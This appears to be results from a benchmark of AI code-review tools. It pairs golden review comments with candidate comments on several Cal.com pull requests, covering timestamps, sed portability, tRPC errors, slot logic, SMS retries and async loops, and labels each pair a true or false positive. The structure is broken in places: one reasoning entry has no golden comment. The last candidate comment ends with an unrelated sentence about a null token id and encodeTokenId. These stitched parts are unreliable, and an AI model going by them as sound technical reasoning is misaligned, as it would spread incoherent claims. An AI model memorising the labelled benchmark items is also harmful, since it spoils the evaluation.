The only test change is adding `unsubscribe_url` to an existing builder so the suite keeps passing. There is no spec asserting that the per-topic unsubscribe URL actually appears in the email body/HTML, no spec for `Topic#unsubscribe_url`, and no controller spec for `TopicsController#unsubscribe`. Given the nil-`TopicUser` crash, the non-idempotent toggle and the GET-based mutation, a controller spec covering (a) no existing topic_users row, (b) repeated requests, and (c) the slug redirect is needed to prevent regressions.

Class attribute contains a stray leading dot

`<h4 class='.previous-discussion'>` sets the literal class name `.previous-discussion`, so any email stylesheet rule targeting `.previous-discussion` will never match. Since this line is being reformatted in this PR anyway, drop the leading dot.

true_positives.golden_comment: The updateManyByCredentialId call uses an empty data object, which prevents Prisma's @updatedAt decorator from updating the updatedAt timestamp. This results in inaccurate cache status tracking, as the timestamp isn't updated when the cache is refreshed. To fix this, explicitly set the updatedAt field.
true_positives.matched_candidate:
updateManyByCredentialId called with an empty data object to bump updatedAt

`SelectedCalendarRepository.updateManyByCredentialId(this.credential.id, {})` relies on Prisma implicitly writing the `@updatedAt` column when `data` is empty. This is implicit/undocumented behaviour — if Prisma emits no SET clause the call is a pure no-op write — and even when it works it issues an extra UPDATE over every SelectedCalendar row of the credential on every cache refresh (including rows that were not refreshed), which runs on the cache cron for every watched credential. The PR description itself notes `SelectedCalendar.updatedAt` is not consumed by the frontend (the UI uses `cacheUpdatedAt`), so this write appears unnecessary; if it is needed, pass an explicit `{ updatedAt: new Date() }`.
true_positives.reasoning: The candidate identifies the same empty-data updateManyByCredentialId call and the risk that Prisma will not update the @updatedAt timestamp, and proposes explicitly setting updatedAt. Although it hedges the behavior and adds concerns about unnecessary writes, the underlying issue matches.

true_positives.golden_comment: logic: macOS-specific sed syntax with empty string after -i flag will fail on Linux systems
true_positives.matched_candidate:
sed -i '' is BSD/macOS-only and breaks on Linux

`sed -i '' -E "s|...|" "$ENV_FILE"` uses the BSD syntax where `-i` takes a separate (empty) suffix argument. With GNU sed (Linux CI/dev containers) the empty string is parsed as the script/first file operand and the command fails with "can't read : No such file or directory", leaving `GOOGLE_WEBHOOK_URL` un-updated while the script still reports success. Use `sed -i.bak`/a temp-file approach, or branch on the platform.
true_positives.reasoning: Both identify the same portability bug: BSD/macOS sed syntax using a separate empty argument after -i fails on GNU sed on Linux.

true_positives.golden_comment: Throwing a generic Error for authentication failures results in a 500 response in tRPC. Instead, it should return a structured TRPCError with an appropriate code, such as FORBIDDEN, to accurately reflect the error type.
true_positives.matched_candidate:
deleteCache throws a plain Error instead of TRPCError

When the credential does not exist or does not belong to the caller the handler throws `new Error("Credential not found or access denied")`. tRPC maps non-TRPCError exceptions to `INTERNAL_SERVER_ERROR` (HTTP 500), so an authorization failure is reported as a server fault, gets logged/reported to error tracking as a crash, and the client cannot distinguish it from a real failure. Use `throw new TRPCError({ code: "NOT_FOUND" | "FORBIDDEN", message: ... })` as the other handlers in this router do.
true_positives.reasoning: Both identify that throwing a plain Error for authentication or authorization failures causes tRPC to return HTTP 500 instead of an appropriate structured TRPCError, such as FORBIDDEN.

true_positives.golden_comment: Date is formatted with hardcoded 'en-US' locale instead of using the user's locale from useLocale, which can lead to incorrect date representation for users in different locales.
true_positives.matched_candidate:
Cache timestamp is hard-coded to en-US formatting

`new Intl.DateTimeFormat("en-US", { dateStyle: "short", timeStyle: "short" })` ignores the user's locale and 12h/24h `timeFormat` preference stored on the user, so non-US users see MM/DD/YYYY and AM/PM dates inside an otherwise localized UI (the surrounding string is translated via `cache_last_updated`). Use the user's locale/time-format (e.g. the existing dayjs/`useTimePreferences` helpers) instead of a literal "en-US".
true_positives.reasoning: Both identify the same underlying issue: hardcoded en-US date formatting ignores the user's locale and can display dates incorrectly for non-US users. The candidate's additional time-format concern does not change the match.

false_positives.candidate:
Cache deletion does not invalidate the connectedCalendars query

`deleteCacheMutation.onSuccess` only shows a toast and calls the optional `onSuccess` prop. Unlike the disconnect mutation (which invalidates `viewer.calendars.connectedCalendars` in `onSettled`), nothing invalidates the query that produced `cacheUpdatedAt`. In `SelectedCalendarsSettingsWebWrapper` the `onChanged` prop is optional and is not always supplied, and the query is configured with `refetchOnWindowFocus: false`, so after deleting the cache the dropdown keeps showing the old "Last updated" timestamp and the "Delete cached data" entry until a full page reload, making it look like the deletion failed.

getCacheStatusByCredentialIds ignores expiresAt

The groupBy query selects `MAX(updatedAt)` for the given credentialIds without filtering on `expiresAt >= now()`, while `getCachedAvailability` only serves non-expired rows. As a result the UI will report a credential as having a cache ("Cache Status / Last updated …") and offer "Delete cached data" even when every cached row is expired and no availability request can be served from it, giving users a misleading view of cache health.

UserWithCalendars now requires updatedAt/googleChannelId that are never used

`UserWithCalendars` (an exported type consumed outside this file, e.g. by the platform API v2 calendars service and other callers of `getConnectedDestinationCalendarsAndEnsureDefaultsInDb`) was widened to require `updatedAt` and `googleChannelId` on `allSelectedCalendars` and `userLevelSelectedCalendars`, but neither field is read anywhere in this module. Any caller that selects only `externalId`/`integration`/`eventTypeId` will now fail type-check, and `UserRepository.findUnlockedUserForSession` had to be changed to fetch two extra columns per selected calendar into the session payload purely to satisfy the type. Revert the type tightening unless the fields are actually needed.

updateManyByCredentialId types data as SelectedCalendarUpdateInput

`updateMany` accepts `Prisma.SelectedCalendarUpdateManyMutationInput`, not `SelectedCalendarUpdateInput`. Using the single-record update type lets callers pass nested relation operations (e.g. `{ user: { connect: { id } } }`) which type-check but fail at runtime with a Prisma validation error. Change the parameter type to `Prisma.SelectedCalendarUpdateManyMutationInput`.

Dev script writes .env outside the repository

`ENV_FILE="../.env"` is resolved relative to the current working directory, not to the script location. The documented way of running repo scripts is from the repository root (`./scripts/test-gcal-webhooks.sh`), which makes the script create/modify a `.env` file in the parent directory of the checkout (and print "Updated GOOGLE_WEBHOOK_URL" as if it had succeeded), while the app's real `.env` is left untouched. Resolve the path from `$(dirname "$0")/..` instead.

dev:cron uses npx tsx but tsx is not a dependency

`"dev:cron": "npx tsx cron-tester.ts"` invokes a binary that is not declared in `devDependencies` (only `ts-node` is, and it is still used by the `check-changed-files` and `translate-locales` scripts). `npx` will download an unpinned `tsx` from the network on each run (or prompt), which fails in offline/CI environments and is inconsistent with the yarn-workspace setup. Add `tsx` to devDependencies and call it via `yarn tsx`, or leave the script on `ts-node`. This change is also unrelated to the feature in this PR.

Cache status lookup bypasses the calendar-cache feature flag

The handler instantiates `CalendarCacheRepository` directly instead of going through `CalendarCache.init(...)`, so the `CalendarCacheRepositoryMock` added in this PR is never used and an extra `calendarCache.groupBy` query is executed on every `connectedCalendars` request even for deployments/teams where calendar cache is disabled (and also when `credentialIds` is empty, producing a pointless `IN ()` query). Route through the feature-flag aware factory, or skip the query when there are no credentialIds / the feature is off.

Migration comment contradicts the statement and backfill produces misleading timestamps

The generated warning block says the required column is added "without a default value. This is not possible if the table is not empty", but the statement does supply `DEFAULT NOW()`; the stale comment will mislead reviewers/operators about the migration's safety. In addition, all pre-existing rows are backfilled with the migration time, so immediately after deploy the new UI will report long-stale caches as "Last updated: <deploy time>". Consider removing/correcting the comment and documenting (or backfilling from `expiresAt - CACHING_TIME`) the known inaccuracy.

No tests for the new deleteCache authorization or cache-status query

`deleteCacheHandler` performs an ownership check that gates a destructive `calendarCache.deleteMany`, and `CalendarCacheRepository.getCacheStatusByCredentialIds` is new behaviour surfaced in the UI, yet neither has a unit test. A regression in the `userId` predicate would let a user delete another user's calendar cache, and nothing would catch it. Add tests covering: deletion for an owned credential, rejection for a credential owned by another user, and the credential→updatedAt mapping returned by the repository.

true_positives.golden_comment: Incorrect end time calculation using slotStartTime instead of slotEndTime
true_positives.matched_candidate:
`end` is computed from slotStartTime, so the slot end is never validated against working hours

`const end = slotStartTime.hour() * 60 + slotStartTime.minute();` duplicates the `start` expression instead of using `slotEndTime`. As a result the `end > workingHour.endTime` comparison can never detect a slot that overruns the end of a host's working hours. For a round-robin event where the fixed host works 09:00-12:00 and a round-robin host works 09:00-17:00, the aggregate working hours produce an 11:30 slot; for a 60-minute event it ends at 12:30, outside the fixed host's availability, yet this check passes it — exactly the over-booking of fixed hosts this PR is meant to prevent.
true_positives.reasoning: The candidate identifies the exact same bug: the end time is calculated using slotStartTime instead of slotEndTime, preventing proper validation against working hours.

true_positives.golden_comment: Using === for dayjs object comparison will always return false as it compares object references, not values. Use .isSame() method instead: dayjs(date.start).add(utcOffset, 'minutes').isSame(dayjs(date.end).add(utcOffset, minutes))
true_positives.matched_candidate:
Dead branch: dayjs instances compared with `===`

`if (dayjs(date.start).add(utcOffset, "minutes") === dayjs(date.end).add(utcOffset, "minutes"))` compares two freshly-created objects by reference, which is always false, so this branch never executes. It was presumably meant to handle a zero-length override (a date marked completely unavailable) via `isSame()`/`valueOf()`. As written the "whole day blocked" case falls through to the generic range checks, making the behaviour accidental and hard to reason about; it also means the intent of the code is not actually implemented.
true_positives.reasoning: Both identify the same bug: strict equality compares the references of newly created dayjs objects rather than their date values, so the condition is always false. Both recommend value-based comparison such as isSame().

false_positives.candidate:
Working-hours check uses `find` with inverted logic, rejecting valid slots for users with more than one availability block

`checkIfIsAvailable` rejects a slot if `workingHours.find(...)` locates *any* working-hours entry for the slot's weekday that does not contain the slot (`start < workingHour.startTime || end > workingHour.endTime` → `return false` for the slot). `WorkingHours` is a list, and a single user routinely has several entries for the same day: a split schedule (e.g. 09:00-12:00 and 13:00-17:00 UTC) yields two entries, and `getWorkingHours` additionally splits any schedule that crosses UTC midnight into two entries. With a 09:00-12:00 / 13:00-17:00 schedule, the 10:00 slot is inside the first entry but outside the second, so the second entry makes the function return `false` and the slot disappears. Because every user of a personal event is treated as a fixed host (`isFixed: !eventType.schedulingType`), this silently removes all slots for any user with a lunch break or a schedule spanning UTC midnight. The condition must be "no entry contains the slot" (`!workingHours.some(containsSlot)`), not "some entry does not contain the slot".

Date-override check rejects slots when a date has multiple override ranges

The `dateOverrides.find(...)` predicate returns `true` as soon as *one* override entry for the slot's date does not contain the slot, and the outer `if` then returns `false` (slot unavailable). Cal.com allows several time ranges for a single date override day, and `getUserAvailability` returns one `{start,end}` entry per range. With overrides 09:00-11:00 and 14:00-16:00 on the same date, a 09:30 slot is inside the first range but `slotEndTime.isBefore(14:00)` is true for the second range, so the slot is dropped; symmetrically the 14:30 slot is dropped by the first range. The net effect is that no slots at all are offered on days with more than one override range. The check must be "the slot is contained in none of the ranges for that date" rather than "some range does not contain the slot".

Override containment check ignores the slot end, allowing bookings that overrun the override window

Within the matched date override only two rejections exist: the slot ends before/at the override start, or the slot *start* is strictly after the override end. A slot that starts inside the override but finishes after it is therefore accepted: with an override of 09:00-11:00 and a 60-minute event, the 10:30 slot (ending 11:30) is reported as available. Likewise a slot starting exactly at the override end (11:00) passes because `isAfter` is not inclusive. For round-robin events this re-introduces the problem the PR fixes — the fixed host gets booked outside their date override. The condition should require `slotEndTime` to be ≤ override end (and use `isSameOrAfter` for the start comparison).

Override date comparison mixes server-local and UTC formatting

`dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` builds a dayjs in the *server's local* timezone, while `slotStartTime.format("YYYY MM DD")` is UTC (`slotStartTime = time.utc()`). On any deployment whose process timezone is not UTC the two date strings disagree near midnight, so `dateOverrideExist` is not set for the correct day: overrides are silently ignored (host booked when unavailable) or applied to the wrong day (all slots of a normal day dropped). Use `dayjs.utc(date.start)` so both sides are evaluated in the same zone.

Timezone-shifted override wraps across midnight and lands on the wrong day

`startTime`/`endTime` are derived as `hour()*60 + minute()` after shifting the override by `inviteeUtcOffset - organizerUtcOffset`, and are then applied relative to `startOfInviteeDay`. When the shift pushes the override past midnight the minute-of-day silently wraps and the override is applied to the wrong date. Example: organizer in UTC with an override 22:00-23:30 on day D, invitee in Asia/Kolkata (offset +330). The shifted time is 03:30-05:00 on D+1, giving startTime=210, which is added to the invitee's start of day D (18:30 UTC on D-1) producing slots at 22:00 UTC on D-1 — a full day earlier than the real override. In the opposite direction (negative offset crossing back over midnight) the wrap can make `endTime < startTime`, in which case `buildSlots` drops the range (`if (start >= end) continue;`) and the override produces no slots at all.

`override.timeZone` is optional; a missing value silently uses dayjs' default timezone

`dayjs(override.start.toString()).tz(override.timeZone)` relies on the new optional `timeZone` field added to `TimeRange` in packages/types/schedule.d.ts. When a caller of `getSlots` passes date overrides without `timeZone` (the field is `timeZone?: string`), `.tz(undefined)` falls back to dayjs' default/guessed timezone (the machine's zone), so `organizerUtcOffset` is computed from an unrelated zone and the override is shifted by an arbitrary amount instead of keeping the previous UTC interpretation. Either make `timeZone` required for date overrides in this code path or default explicitly to `"UTC"`/the organizer timezone already passed into `getSlots`.

Expensive per-slot timezone offset computation in the hot slot-filtering loop

`checkIfIsAvailable` is invoked once per candidate slot per host (hundreds to thousands of times per `getSchedule` call on this public endpoint). For every invocation and every date override it calls `dayjs.tz(date.start, organizerTimeZone).utcOffset()` (Intl-backed, comparatively slow) and constructs ~5 additional dayjs objects, even though `utcOffset` and the converted override start/end are independent of the slot being tested. These values should be computed once per host/override before the slot loop (e.g. precomputed alongside `userAvailability`) rather than inside the predicate.

No test covers the main fix (fixed-host date overrides in round-robin) or the new edge cases

The only test added exercises a single-range date override for a personal event viewed from a second timezone. The headline behaviour of the PR — a fixed host's date override limiting the slots of a ROUND_ROBIN event (new `dateOverrides`/`workingHours` handling inside `checkIfIsAvailable`) — has no coverage, so the fixed-host filtering path is unverified. The new code paths that are most likely to regress are also untested: a schedule with two availability blocks on the same day (currently removes all slots, see the `workingHours.find` logic), a date with multiple override ranges, and a slot that overruns the end of an override. Adding a scenario with `hosts: [{isFixed: true,...},{isFixed: false,...}]`, `schedulingType: "ROUND_ROBIN"` and an override on the fixed host would catch these.

true_positives.golden_comment: The deletion logic in scheduleSMSReminders.ts incorrectly deletes non-SMS workflow reminders (e.g., Email, WhatsApp) that have retryCount > 1. This occurs because the retryCount condition within the OR clause for deletion lacks a method: WorkflowMethods.SMS filter, causing it to apply to all reminder types instead of only SMS reminders, which is the intended scope of this function.
true_positives.matched_candidate:
deleteMany `retryCount > 1` arm is not scoped to SMS reminders

The new OR branch in the `prisma.workflowReminder.deleteMany()` call matches `retryCount > 1` for *every* row in `WorkflowReminder`, with no `method` filter. This SMS cron therefore deletes EMAIL and WHATSAPP reminders too as soon as anything starts incrementing `retryCount` for them (e.g. when the same retry logic is added to `scheduleEmailReminders`/`scheduleWhatsappReminders`, or if a future writer sets the field). It also deletes rows that are already `scheduled: true` with a `referenceId`, losing the record needed to cancel the scheduled message later. The branch should be scoped with `method: WorkflowMethods.SMS` (and arguably `scheduled: false`).
true_positives.reasoning: The candidate identifies the same missing SMS method filter on the retryCount > 1 deletion branch, which causes non-SMS reminders such as Email and WhatsApp to be deleted. Its additional concern about scheduled reminders does not change this match.

false_positives.candidate:
retryCount update inside catch can abort the whole cron run

The `prisma.workflowReminder.update()` added at the top of the `catch` block is not itself protected. Before this change the catch only called `console.log`, so any error for one reminder was swallowed and the loop continued. Now, if this update throws (row deleted concurrently by the `deleteMany` of a parallel invocation → Prisma P2025 "record not found", or a DB connection error, which is exactly the kind of failure likely to have caused the original exception), the rejection propagates out of the `for` loop, every remaining unscheduled reminder in the batch is skipped, and the endpoint returns a 500 instead of the expected response. Wrap the update in its own try/catch (or `.catch()`) so a bookkeeping failure cannot abort the batch.

Transient failures cause permanent deletion of pending SMS reminders

`retryCount` is incremented for every failure path without distinguishing permanent errors (invalid phone number, which is the motivating case) from transient ones (Twilio outage/5xx, network timeout, DB hiccup, rate limiting). Since the cron processes all reminders due within the next 7 days on every run, two consecutive bad runs are enough to push `retryCount` to 2 for the entire backlog, and the next run's `deleteMany` silently deletes all of them — reminders that would have sent fine are lost permanently with no notification. Consider only counting non-retryable Twilio errors, or using a time-based backoff/last-attempt timestamp so retries are spread out rather than consumed within minutes/hours of each other.

No retry accounting when message is empty or sendTo is missing

The retryCount increment only happens inside `if (message?.length && message?.length > 0 && sendTo)`. When `sendTo` is null (e.g. `booking.smsReminderNumber` not set for an SMS_ATTENDEE step) or the rendered `message` is empty, the loop body falls through without touching the row: `scheduled` stays `false` and `retryCount` stays unchanged, so this reminder is re-selected and re-processed (including the `prisma.profile.findFirst` and `getBookerBaseUrl` queries) on every cron invocation until `scheduledDate` passes. That is precisely the endless-rescheduling behaviour this PR is meant to eliminate, and it remains unfixed for these cases.

OR on unindexed retryCount forces a full scan of WorkflowReminder on every cron run

The rewritten `deleteMany` produces `WHERE (method = 'SMS' AND scheduledDate <= now) OR retryCount > 1`. There is no index on `retryCount` (the schema only has `[method, scheduled, scheduledDate]` and `[cancelled, scheduledDate]`), so the OR prevents an index-only plan and Postgres will sequentially scan the whole `WorkflowReminder` table each time this cron runs. On a table of this size (one row per reminder per booking) that is a noticeable repeated cost. Splitting into two `deleteMany` calls (one per condition, with the retry one scoped to `method: SMS`) and/or indexing the retry predicate would keep the existing index usable.

Comment no longer describes what the delete query does

The comment `//delete all scheduled sms reminders where scheduled date is past current date` now sits above a query that also deletes any reminder (of any method) whose `retryCount` exceeds 1. A reader relying on the comment will not realise rows are being removed for retry exhaustion, which is the main new behaviour here. Update the comment to mention the retry-count deletion.

No tests for the new retry/delete behaviour

The PR introduces behaviour that permanently deletes user-facing reminders (increment on failure, delete when `retryCount > 1`) and no test covers it: there is no assertion that a failed `twilio.scheduleSMS` increments `retryCount`, that a falsy (non-throwing) return also increments it, that a successful schedule leaves the row intact, or that the delete threshold yields exactly two attempts. Given the data-loss consequence of an off-by-one here (threshold `gt: 1` vs `gte: 1`), a unit test around the handler with a mocked twilio provider would be worth adding.

false_negatives.golden_comment: Using retryCount: reminder.retryCount + 1 reads a possibly stale value and can lose increments under concurrency; consider an atomic increment via Prisma (increment: 1) to avoid race conditions (also applies to the similar update in the catch block).

true_positives.golden_comment: In getBaseConditions(), the else if (filterConditions) and final else branches are unreachable. This is because getAuthorizationConditions() always returns a non-null Prisma.Sql object, making authConditions always truthy, which means only the first two if/else if conditions are ever evaluated.
true_positives.matched_candidate:
Unreachable branches in getBaseConditions

`getAuthorizationConditions()` always resolves to a `Prisma.Sql` object (at minimum `NOTHING_CONDITION`), and objects are always truthy, so the `else if (filterConditions)` branch (line 76) and the final `else return NOTHING_CONDITION` (line 79) can never execute. The dead code suggests the author expected auth conditions to possibly be null/absent; if a future change makes auth conditions optional the fallback would silently drop authorization. Either drop the dead branches or make the nullability explicit.
true_positives.reasoning: Both identify the same unreachable branches in getBaseConditions(): getAuthorizationConditions() always returns a non-null, truthy Prisma.Sql object, so the filterConditions-only branch and final else never execute.

false_positives.candidate:
Returned SQL fragments contain top-level OR without enclosing parentheses

`getBaseConditions()` returns the authorization fragment verbatim when no filters are set (line 75), and for `org`/`team` scope that fragment is built by the reduce as `(A AND "isTeamBooking" = true) OR (B AND "isTeamBooking" = false)` with no enclosing parentheses (lines 171-174 and 204-207). The same is true for `getFilterConditions()` when only `eventTypeId` is set (`("eventTypeId" = x) OR ("eventParentId" = x)`). Because `AND` binds tighter than `OR` in SQL, any consumer that composes the fragment with extra predicates — e.g. `WHERE ${baseConditions} AND "startTime" >= ${from}` — produces `A OR (B AND startTime >= ...)`, so the additional predicate constrains only one branch of the OR. The result is silently widened row sets, i.e. a potential authorization/scope bypass and wrong insights numbers. The fragments should be wrapped (`Prisma.sql`(${cond})`) before being returned. Note the only test uses `WHERE ${baseConditions}` standalone, so this failure mode is not covered.

Public findMany() removed without updating any callers

The public method `findMany(findManyArgs: Prisma.BookingTimeStatusDenormalizedFindManyArgs)`, which ran `prisma.bookingTimeStatusDenormalized.findMany` with the authorization and filter where-clauses applied, is deleted and replaced by `getBaseConditions()` returning a raw `Prisma.Sql`. No other file in the repository is touched by this PR, so any existing consumer of `InsightsBookingService.findMany` will no longer compile, and consumers must now hand-write raw SQL (taking on responsibility for parenthesization, column quoting and result typing). Either keep a `findMany`-style convenience wrapper or update the call sites in this PR. The PR description also states that only the tests changed and that the service was already converted, which hides this breaking change from reviewers.

New InsightsBookingServicePublicOptions weakens compile-time validation of options

The constructor parameter type changed from the zod discriminated union (`InsightsBookingServiceOptions`, which requires `teamId` when `scope === "team"`) to the hand-written `InsightsBookingServicePublicOptions` with `scope: "user" | "org" | "team"` and optional `teamId`. A caller can now pass `{ scope: "team", userId, orgId }` without `teamId` and it type-checks; at runtime `safeParse` fails, `this.options` becomes `null`, and the service silently returns `1=0`, i.e. an empty result set with no error or log. The previous typing made this a compile error. Keep the discriminated union as the constructor type (or at least log/throw when validation fails) so misuse is caught instead of producing silently empty insights.

Caching tests deleted although the caching logic still exists

The `describe("Caching")` block (previously asserting that `getAuthorizationConditions()` and `getFilterConditions()` return the same cached value on repeated calls) was removed, but the service still implements `cachedAuthConditions` / `cachedFilterConditions` memoization, including the `undefined`-vs-`null` distinction in `getFilterConditions()` (a cached `null` must not trigger a rebuild). That memoization path is now untested, so a regression such as caching `null` incorrectly or rebuilding conditions on every call would go unnoticed. The tests could simply be ported to the new `Prisma.sql` expectations instead of deleted.

requestReschedule awaits inside `forEach`, so calendar/video cancellations are unawaited and errors are unhandled

`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); ... })` is fire-and-forget: the mutation continues to send the reschedule email, fire webhooks and return while the `deleteEvent`/`deleteMeeting` calls have not even been issued yet (they are now gated behind the awaited `getCalendar`). There is no try/catch here at all, so a failing credential or app import becomes an unhandled promise rejection in the tRPC server process. Iterate with `for (const bookingRef of bookingRefsFiltered)` and `await`, or collect promises and `await Promise.all(...)` with a `.catch` so failures are logged.
true_positives.reasoning: The candidate explicitly identifies missing try/catch around the awaited getCalendar call and notes that app import failures become unhandled promise rejections, matching the golden concern. It additionally highlights the async forEach problem.

true_positives.golden_comment: The code uses forEach with async callbacks, which causes asynchronous operations (e.g., calendar/video event deletions, payment refunds) to run concurrently without being awaited. This 'fire-and-forget' behavior leads to unhandled promise rejections, race conditions, and incomplete cleanup, as surrounding try-catch blocks cannot properly handle errors from these unawaited promises. Replace forEach with for...of loops or Promise.all() with map() to ensure proper sequential execution and error handling.
true_positives.matched_candidate:
`forEach(async ...)` makes the surrounding try/catch dead and turns errors into unhandled rejections

The callback passed to `bookingRefsFiltered.forEach` was made `async` so it can `await getCalendar(...)`. `forEach` discards the returned promise, so the enclosing `try { ... } catch (error) { logger.error(...) }` can no longer observe anything that happens inside: previously a synchronous throw from `getCalendar` was caught and logged, now it (and any `deleteEvent`/`deleteMeeting` rejection) escapes as an unhandled promise rejection, which under Node's default unhandled-rejection handling can kill the process. In addition, the remote delete calls are no longer even *issued* before `Reschedule` returns, because they are now behind an `await`, so the calendar/video events may never be cancelled. Use `for (const bookingRef of bookingRefsFiltered) { ... await ... }` inside the existing try/catch, or `await Promise.all(bookingRefsFiltered.map(async ...))`.
true_positives.reasoning: Both identify the same underlying bug: async callbacks passed to forEach produce unawaited promises, preventing surrounding try/catch blocks from handling failures and risking incomplete cleanup. Both recommend for...of with await or Promise.all with map.

false_positives.candidate:
`forEach(async ...)` makes the surrounding try/catch dead and turns errors into unhandled rejections

Same problem as in `vital/lib/reschedule.ts`: the `forEach` callback is now `async`, so the `try/catch` wrapping it (lines 124-139) can never catch a failure of `getCalendar`, `deleteEvent` or `deleteMeeting` – those rejections now surface as unhandled promise rejections instead of being logged. As a result a `null` raw token id passes validation and later produces an access-token id literally ending in ":null" (`encodeTokenId` concatenates it), instead of failing fast at construction.
